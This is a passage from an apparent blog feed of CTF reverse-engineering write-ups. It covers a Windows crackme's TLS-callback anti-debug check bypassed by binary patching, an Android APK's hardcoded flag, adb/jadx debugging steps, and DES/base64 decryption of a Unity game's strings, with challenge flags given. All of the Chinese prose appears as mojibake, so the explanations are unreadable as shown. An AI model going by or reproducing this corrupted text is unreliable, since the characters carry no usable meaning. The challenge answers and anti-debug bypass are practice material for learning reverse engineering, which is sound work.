function_">TlsCallback_1_0</span><span class="params">(__int64 a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF7AB0940F4);</span><br><span class="line">  <span class="keyword">if</span> ( NtCurrentPeb()-&gt;BeingDebugged == <span class="number">1</span> )</span><br><span class="line">    sub_7FF7AB081AE0();</span><br><span class="line">  result = a2 &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (a2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      *(off_7FF7AB08E060 + i + <span class="number">1</span>) ^= i;</span><br><span class="line">      result = (i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¸­çš„sub_7FF7AB081AE0()å°±æ˜¯åˆšåˆšæ˜¾ç¤ºsomethingwrongçš„å‡½æ•°,æ‰€ä»¥é€šè¿‡patchçš„æ–¹æ³•(keypatch)æŠŠä¸¤ä¸ª==æ”¹æˆ!=è¿™æ ·å°±ä¸ä¼šæŠ¥é”™äº†,ä¿å­˜åæ‰“å¼€patchè¿‡çš„æ–‡ä»¶,è°ƒè¯•,æœç„¶æ²¡é—®é¢˜äº†,ä½†æ˜¯å¹¶æ²¡æœ‰è§£å†³åˆšåˆšçš„é—®é¢˜,æ‰€ä»¥ç»§ç»­æ‰§è¡Œçœ‹çœ‹å“ªé‡Œä¸å¯¹,äºæ˜¯å‘ç°:</p><p>ttæ•°ç»„å’Œcheckæ•°ç»„çš„å€¼è¢«ä¿®æ”¹äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt[<span class="number">8</span>] = &#123; <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> Q[<span class="number">8</span>] = &#123; <span class="number">0x9523F2E0</span>,<span class="number">0x8ED8C293</span>,<span class="number">0x8668C393</span>,<span class="number">0xDDF250BC</span>,<span class="number">0x510E4499</span>,<span class="number">0x8C60BD44</span>,<span class="number">0x34DCABF2</span>,<span class="number">0xC10FD260</span> &#125;;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸ªå€¼å»è®¡ç®—å³å¯è·å¾—æ­£ç¡®çš„ç­”æ¡ˆ</p><p>flag{W31com3_2_Th3_QwbS7_4nd_H4v3_Fun}</p><hr><h2 id="å¤ç›˜">å¤ç›˜</h2><p>ç°åœ¨çš„é—®é¢˜æ˜¯</p><p>ä¸ºä»€ä¹ˆmainå‡½æ•°æ²¡æœ‰è°ƒç”¨é‚£ä¸¤ä¸ªå‡½æ•°,ä½†æ˜¯é‚£ä¸¤ä¸ªå‡½æ•°ä¼šå…ˆè¿è¡Œå‘¢,è¿™é‡Œè¦è®²åˆ°ä¹‹å‰æåˆ°çš„TlsèŠ‚åŒºäº†,TLSæ˜¯çº¿ç¨‹å±€éƒ¨å‚¨å­˜çš„ç¼©å†™,æœ‰ä¸€ç§å‡½æ•°å«TLSå›è°ƒå‡½æ•°,è¿™ç§å‡½æ•°åœ¨çº¿ç¨‹åˆ›å»ºæ—¶å’Œé”€æ¯æ—¶ä¼šæ‰§è¡Œä¸€æ¬¡</p><blockquote><p>TLSå›è°ƒå‡½æ•°çš„è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†æä¾›ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å…¨å±€å˜é‡å‰¯æœ¬ï¼Œä»è€Œé¿å…äº†å¤šçº¿ç¨‹åŒæ­¥é—®é¢˜ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæä¾›äº†ä¸€ç§åœ¨æ¯ä¸ªçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸçš„å¼€å§‹å’Œç»“æŸæ—¶æ‰§è¡Œç‰¹å®šä»£ç çš„æœºåˆ¶</p></blockquote><p>æ‰€ä»¥åˆšåˆšçš„åè°ƒè¯•å‡½æ•°å°±æ˜¯Tlså‡½æ•°å­˜åœ¨ç‰¹æ®Šçš„èŠ‚åŒºTlsèŠ‚åŒº,è¯¦ç»†å†…å®¹å¯ä»¥çœ‹&lt;é€†æ ¸&gt;p550.</p><p>ç„¶åå†çœ‹çœ‹å®ƒæ˜¯å¦‚ä½•ä¿®æ”¹æ•°æ®çš„</p><details class="folding-tag" ><summary> ä¿®æ”¹å¤„ä»£ç  </summary>              <div class='content'>              <div class="tabs" id="ä¸€å…±ä¸¤å¤„"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#ä¸€å…±ä¸¤å¤„-1">ä¿®æ”¹check</button></li><li class="tab"><button type="button" data-href="#ä¸€å…±ä¸¤å¤„-2">ä¿®æ”¹tt</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="ä¸€å…±ä¸¤å¤„-1"><img src="https://s2.loli.net/2023/12/18/FpAZCvdYrfTbEPh.png" alt="å…¶ä¸€" style="zoom:67%;" /><p>off_14001E060åœ¨å†…å­˜ä¸­çš„ä½ç½®</p><img src="https://s2.loli.net/2023/12/18/Std51B2mhMzP6LX.png" alt="è¿™é‡Œçš„å€¼æ˜¯ä¸€ä¸ªåç§»,åç§»çš„ä½ç½®æ˜¯checkä¸Šé¢ä¸€ä½" style="zoom:67%;" /><p>æ‰€ä»¥i+1å°±æ˜¯checkæ•°ç»„</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="ä¸€å…±ä¸¤å¤„-2"><img src="https://s2.loli.net/2023/12/18/E5zerdQqav2l9P7.png" alt="äºŒå·åœ¨è¿™é‡Œ" /><img src="https://s2.loli.net/2023/12/18/DVn6sjmElvOCUWe.png" alt="è¿™ä¸ªå‡½æ•°æ˜¯ä¸Šé¢çš„å›¾é‡Œé¢çš„å‡½æ•°é‡Œé¢çš„å‡½æ•°" /><img src="https://s2.loli.net/2023/12/18/IuTFmv57Qjoe28s.png" alt="è¿™é‡Œçš„æ–¹æ³•ä¸€æ ·ä½†æ˜¯çœ‹åˆ°åç§»å¾ˆæŠ½è±¡" /><p>è¿™é‡Œæ˜¯åˆ°1DFFF+1å°±æ˜¯1E000å°±æ˜¯ttçš„ä½ç½®(æˆ‘åªèƒ½è¯´å¾ˆé˜´é™©)</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>              </div>            </details><p>å®é™…ä¸Š,è¿™é“é¢˜åªè¦åŠ¨æ€è°ƒè¯•è¿›å…¥mainå°±å¯ä»¥è§£å†³äº†</p><p>ok,å®Œç»“æ’’èŠ±</p><hr><h2 id="å¦ä¸€ç§åšæ³•">å¦ä¸€ç§åšæ³•</h2><p>idaæœ‰ä¸€ç§è°ƒè¯•æ–¹å¼å«é™„åŠ è°ƒè¯•ï¼Œå³å…ˆæ‰“å¼€æ–‡ä»¶ï¼Œç„¶åè®©idaé™„åŠ åˆ°è¿›ç¨‹ä¸Šï¼Œå¯¹äºè¿™é“é¢˜æ¥è¯´ï¼Œç”±äºåè°ƒè¯•ä»£ç åªåœ¨Tlså›è°ƒå‡½æ•°ä¸­ï¼Œæ‰€ä»¥ç”¨é™„åŠ è°ƒè¯•å¯ä»¥ç›´æ¥è·³è¿‡åè°ƒè¯•ï¼ŒåŒæ—¶å¾—åˆ°æœ€åçš„å€¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> RE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜è®°å½•(1)</title>
      <link href="/posts/a45b8304.html"/>
      <url>/posts/a45b8304.html</url>
      
        <content type="html"><![CDATA[<h1>æ”»é˜²ä¸–ç•Œ</h1><h2 id="NO-GFSJ0166">NO.GFSJ0166</h2><p>å…ˆç”¨dieæ£€æŸ¥ï¼Œå‘ç°æ˜¯å®‰å“ï¼Œæ”¾åˆ°æ¨¡æ‹Ÿå™¨é‡Œé¢è¿è¡Œï¼Œè¦æ±‚ä¸€ä¸ªå¯†ç </p><p>åœ¨mainactivityé‡Œé¢çœ‹åˆ°</p><p><img src="https://s2.loli.net/2023/12/17/qdvk6MLlsyTuPN5.png" alt="image-20231209203012868"></p><p>æŠŠè¿™ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒäº†ï¼Œå°è¯•è¾“å…¥è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¾—åˆ°</p><p><img src="https://s2.loli.net/2023/12/17/dFKuqcm4U8btaMe.png" alt="image-20231209203053644"></p><p>ä½†æ˜¯flagè¾“å…¥ä¸å¯¹ï¼Œåœ¨mainä¸­çœ‹åˆ°æœ‰flagactivityè¿™ä¸ªç±»ï¼Œè¿›å»çœ‹çœ‹</p><p>æœ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0074R.layout.activity_flag);</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span>[] d = &#123;<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">52</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">106</span>, <span class="number">52</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">109</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">100</span>, <span class="number">51</span>, <span class="number">120</span>, <span class="number">125</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">22</span>; i++) &#123;</span><br><span class="line">            flag = flag.concat(String.valueOf((<span class="type">char</span>) d[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">flagText</span> <span class="operator">=</span> (TextView) findViewById(C0074R.C0076id.flagText);</span><br><span class="line">        flagText.setText(flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰ä¹Ÿæ²¡é—®é¢˜â€¦æœ€åå‘ç°flagä¸èƒ½åŠ flagï¼Œç›´æ¥w4nn4_j4r_my_d3xå³å¯ã€‚</p><p>å˜æ¢æ£€éªŒè€Œä¸å˜æ¢è¾“å…¥</p><hr><h1>BUUCTF</h1><h2 id="newstarctf2023reweek2ï¼šAndroDbgMe">newstarctf2023reweek2ï¼šAndroDbgMe</h2><p>ç”¨jadxæ‰“å¼€ï¼š</p><p><img src="https://s2.loli.net/2023/12/17/dptFY3Pk78Qq9V2.png" alt="image-20231210130908057"></p><p>è¿™ä¸ªå­—ç¬¦ä¸²çœŸæ˜¯å¤ªæŠ½è±¡äº†ï¼</p><p>ç”¨æ¨¡æ‹Ÿå™¨æ‰“å¼€apkï¼š</p><p><img src="https://s2.loli.net/2023/12/17/ikML3gJF2ofOP46.png" alt="image-20231210123339930"></p><p>å‘ç°å®ƒåªæ˜¯æ ¹æ®è¾“å…¥åšå˜æ¢ç„¶åè¾“å‡ºï¼Œå¹¶æ²¡æœ‰æ ¡éªŒï¼Ÿï¼Ÿï¼Ÿç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§é¢˜</p><p>åŒæ—¶è¾“å‡ºæ˜¯ä»¥toastæ¶ˆæ¯æ˜¾ç¤ºçš„ï¼Œæ‰€ä»¥çœ‹çœ‹æœ‰æ²¡æœ‰å’Œtoastæœ‰å…³çš„ï¼šæœç´¢åå‘ç°</p><p><img src="https://s2.loli.net/2023/12/17/yx6SLP1RB3N7AZk.png" alt="image-20231210123657945"></p><p>è¿™ä¸ªæ—¶å€™æˆ‘å‘ç°é™æ€åˆ†æå¤ªéš¾äº†ï¼Œçœ‹åˆ°é¢˜ç›®åå­—ï¼šdbgmeæƒ³åˆ°ä¼šä¸ä¼šè¦åŠ¨æ€è°ƒè¯•</p><p>ï¼ˆè¯·æ•™å¤§ä½¬å®‰å“è°ƒè¯•ingï¼‰</p><p>ç„¶åæ•´ç†å®‰å“è°ƒè¯•æµç¨‹å¦‚ä¸‹ï¼š</p><p>å‰ç½®æµç¨‹ï¼š</p><ol><li>å…ˆä¸‹è½½adbï¼ˆéƒ¨åˆ†æ¨¡æ‹Ÿå™¨è‡ªå¸¦adbï¼Œåœ¨æ¨¡æ‹Ÿå™¨æ ¹ç›®å½•ï¼‰</li><li>æ‰“å¼€æ¨¡æ‹Ÿå™¨çš„rootå’Œå¼€å‘è€…æ¨¡å¼ï¼Œåœ¨å¼€å‘è€…æ¨¡å¼é‡Œé¢å¼€usbè°ƒè¯•</li></ol><p>ç„¶åï¼š</p><ol><li>ç”¨adbè¿æ¥æ¨¡æ‹Ÿå™¨ï¼šadb connect 127.0.0.1ï¼šxxxxxï¼ˆxxxxxæ ¹æ®æ¨¡æ‹Ÿå™¨è€Œå®šï¼‰ï¼Œä¸è¦å…³é—­</li><li>æ‰“å¼€jadxçš„debugåŠŸèƒ½ï¼Œé¡¶ä¸Šçš„<img src="https://s2.loli.net/2023/12/17/KGJzYeBwxroNOgR.png" alt="image-20231210140413425" style="zoom:33%;" />ï¼Œç„¶ååº”è¯¥èƒ½çœ‹åˆ°ä¸‹é¢çš„è®¾å¤‡å‡ºç°äº†å„ç§çº¿ç¨‹</li><li>æ‰¾åˆ°å¯¹åº”è¿›ç¨‹ï¼Œå¼€å§‹è°ƒè¯•</li></ol><p>ç„¶åæ¥åˆ°è¿™ä¸ªç•Œé¢ï¼Œéœ€è¦smaliè¯­æ³•ã€‚ã€‚</p><p><img src="https://s2.loli.net/2023/12/17/YSyhVF8TGX6i2rz.png" alt="image-20231210140637472"></p><p>è¿™æ—¶æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½ä¼šå¾—åˆ°æ­£ç¡®flagï¼ŒåŸæ¥æ˜¯ä¸ªæ•™å­¦é¢˜</p><p><img src="https://s2.loli.net/2023/12/17/RqtiSmFvVZcOC9a.png" alt="image-20231210140705572"></p><p>å®‰å“è°ƒè¯•</p><hr><h2 id="sctf2019-who-is-he">sctf2019 who is he</h2><p>æ‰“å¼€å‹ç¼©åŒ…ï¼Œå‘ç°æ˜¯UNITYæ¸¸æˆï¼Œæ ¹æ®ç½‘ä¸Šæ•™ç¨‹ä¸‹è½½ILSpyåˆ†æassembly-CSharp.dll</p><p>æ‰¾åˆ°<img src="https://s2.loli.net/2023/12/13/oQbqNEAxygl9aUV.png" alt="image-20231213165705074" style="zoom:25%;" />ï¼Œæ‰“å¼€å‡½æ•°æŸ¥çœ‹ï¼š</p><img src="https://s2.loli.net/2023/12/13/etr1y6jVHvKFo9q.png" alt="image-20231213165841784" style="zoom:50%;" /><p>å‘ç°æœ‰ä¸€ä¸ªåˆå§‹å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œä¸€ä¸ªè§£å¯†å‡½æ•°</p><p>startæ˜¯ç©ºå‡½æ•°å¹¶ä¸”æœ€åçš„onclickå‡½æ•°æ˜¯æ£€æµ‹è¾“å…¥æ˜¯å¦æ­£ç¡®ï¼š</p><p><img src="https://s2.loli.net/2023/12/13/Ns8qK23HGxnr1VS.png" alt="image-20231213170122579"></p><p>æ‰€ä»¥åˆ†æåŠ å¯†å’Œè§£å¯†çš„å‡½æ•°ï¼š</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">Encrypt</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span>[] bytes = Encoding.Unicode.GetBytes(encryptKey);</span><br><span class="line"><span class="built_in">byte</span>[] bytes2 = Encoding.Unicode.GetBytes(str);</span><br><span class="line">DESCryptoServiceProvider dESCryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);</span><br><span class="line">cryptoStream.Write(bytes2, <span class="number">0</span>, bytes2.Length);</span><br><span class="line">cryptoStream.FlushFinalBlock();</span><br><span class="line"><span class="built_in">byte</span>[] inArray = memoryStream.ToArray();</span><br><span class="line">cryptoStream.Close();</span><br><span class="line">memoryStream.Close();</span><br><span class="line"><span class="keyword">return</span> Convert.ToBase64String(inArray);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">Decrypt</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span>[] bytes = Encoding.Unicode.GetBytes(encryptKey);</span><br><span class="line"><span class="built_in">byte</span>[] array = Convert.FromBase64String(str);</span><br><span class="line">DESCryptoServiceProvider dESCryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write);</span><br><span class="line">cryptoStream.Write(array, <span class="number">0</span>, array.Length);</span><br><span class="line">cryptoStream.FlushFinalBlock();</span><br><span class="line"><span class="built_in">byte</span>[] bytes2 = memoryStream.ToArray();</span><br><span class="line">cryptoStream.Close();</span><br><span class="line">memoryStream.Close();</span><br><span class="line"><span class="keyword">return</span> Encoding.Unicode.GetString(bytes2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åŠ å¯†å’Œè§£å¯†æµç¨‹å¯¹åº”ï¼ŒåŠ å¯†æ˜¯å…ˆDESç„¶åbase64ï¼Œè§£å¯†ç›¸åï¼Œé‚£ä¹ˆæ ¹æ®è§‚å¯Ÿstræ˜¯åŠ å¯†åçš„å­—ç¬¦ï¼Œå› æ­¤æŠŠè§£å¯†å‡½æ•°å’Œå­—ç¬¦ä¸²ï¼Œå¯†é’¥æ”¾åœ¨ä¸€ä¸ªç±»é‡Œé¢è®¡ç®—ï¼š</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> encryptKey = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> EncryptData = <span class="string">&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">Decrypt</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] bytes = Encoding.Unicode.GetBytes(encryptKey);</span><br><span class="line">            <span class="built_in">byte</span>[] array = Convert.FromBase64String(str);</span><br><span class="line">            DESCryptoServiceProvider dESCryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write);</span><br><span class="line">            cryptoStream.Write(array, <span class="number">0</span>, array.Length);</span><br><span class="line">            cryptoStream.FlushFinalBlock();</span><br><span class="line">            <span class="built_in">byte</span>[] bytes2 = memoryStream.ToArray();</span><br><span class="line">            cryptoStream.Close();</span><br><span class="line">            memoryStream.Close();</span><br><span class="line">            <span class="keyword">return</span> Encoding.Unicode.GetString(bytes2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyClass myClass = <span class="keyword">new</span> MyClass();</span><br><span class="line">        <span class="built_in">string</span> decryptedData = myClass.Decrypt(myClass.EncryptData);</span><br><span class="line">        Console.WriteLine(decryptedData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#He_P1ay_Basketball_Very_We11!Hahahahaha!</span></span><br></pre></td></tr></table></figure><p>é—®é¢˜æ¥äº†ï¼Œç»“æœä¸å¯¹ï¼Œä¸æ˜¯å¾ˆèƒ½ç†è§£ï¼Œå»ç½‘ä¸Šçœ‹wping</p><p>æœ€åè·Ÿç€æ•™ç¨‹åšï¼Œä¸€ç›´éƒ½åšä¸å‡ºæ¥ï¼Œåœ¨å¤§ä½¬æŒ‡ç‚¹ä¹‹ä¸‹ï¼Œå‘ç°æ˜¯å› ä¸ºç”µè„‘æŠ¥æ¯’æŠŠæŸä¸ªæ–‡ä»¶åˆ äº†è¿˜ä¸æé†’ï¼Œæ‰¾åˆ°é‚£ä¸ªæ–‡ä»¶ï¼šï¼Œæ‰“å¼€å‘ç°æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ”¾è¿›dieåˆ†æï¼Œæ˜¯peæ–‡ä»¶ï¼ŒåŠ äº†UPXå£³ï¼Œç”¨upxçš„å®˜æ–¹ç¨‹åºè„±å£³</p><p>æ‰“å¼€ä¹‹å</p><p><img src="https://s2.loli.net/2023/12/13/9t4dPNYcOGzvWSq.png" alt="image-20231213231111411"></p><p>å¤§è‡´æ˜¯åŠ è½½äº†ä¸€ä¸ªdll</p><p>ç»ˆäºç‚¹æŒ‰é’®æœ‰æç¤ºäº†ï¼š<img src="https://s2.loli.net/2023/12/13/hCZbXYD5cVGIT1K.png" alt="image-20231213231322058" style="zoom:25%;" /></p><p>æ ¹æ®ç½‘ä¸Šåšå®¢ï¼ŒCEåˆ†æmono</p><p><img src="https://s2.loli.net/2023/12/13/pif5YAZkJ91rMOE.png" alt="image-20231213231845210"></p><p>å‘ç°å’Œä¹‹å‰é‚£ä¸ªå¾ˆç±»ä¼¼ï¼Œå¹¶ä¸”è¿™ä¸ªdllåœ¨æ¢å¤æŠ¥æ¯’æ–‡ä»¶ä¹‹åæ‰å‡ºç°</p><p>ç”¨monoåˆ†æåŠŸèƒ½æŠŠmainæ”¾åˆ°çª—å£ä¸‹æ–¹ï¼ŒæŒ‰æŒ‰é’®</p><p><img src="https://s2.loli.net/2023/12/13/LGKcgE3eMAdkuZW.png" alt="image-20231213233408953"></p><p><img src="https://s2.loli.net/2023/12/13/JkYizLnvWXbeK3S.png" alt="image-20231213233422155"></p><p>å¾—åˆ°å¯†é’¥testï¼Œç„¶å<code>å‹¾é€‰ä¸ŠUTF-16</code>æœEmmmmæç¤ºè¯ï¼Œå‘ç°å‡ºç°äº†ä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡çš„ä½ç½®æ‰“å¼€å†…å­˜çª—å£ï¼š</p><p><img src="https://s2.loli.net/2023/12/15/cNLMb7mnWEIsRwz.png" alt="image-20231215103737650"></p><p>è¿™æ˜¯ç¬¬äºŒç»„å¯†æ–‡ï¼Œä¸‹é¢ä¹Ÿæœ‰å¯†é’¥testï¼Œå¤åˆ¶ä¸‹æ¥ï¼Œè§£å¯†</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">785A57445A614B4568574E4D43626947595042496C59332B61726F7A4F397A6F6E7772594C69564C346E6A53657A3252594D32577773476E736E6A43446E4873374E34336146764E4535346E6F53616450394638654570765473355150472B4B4C305444452F34306E62553D</span><br></pre></td></tr></table></figure><p>è½¬ä¸º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">xZWDZaKEhWNMCbiGYPBIlY3</span>+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/<span class="number">40</span>nbU=</span><br></pre></td></tr></table></figure><p>ç”¨å¯†é’¥testå’Œåˆšåˆšçš„ç®—æ³•å¾—</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 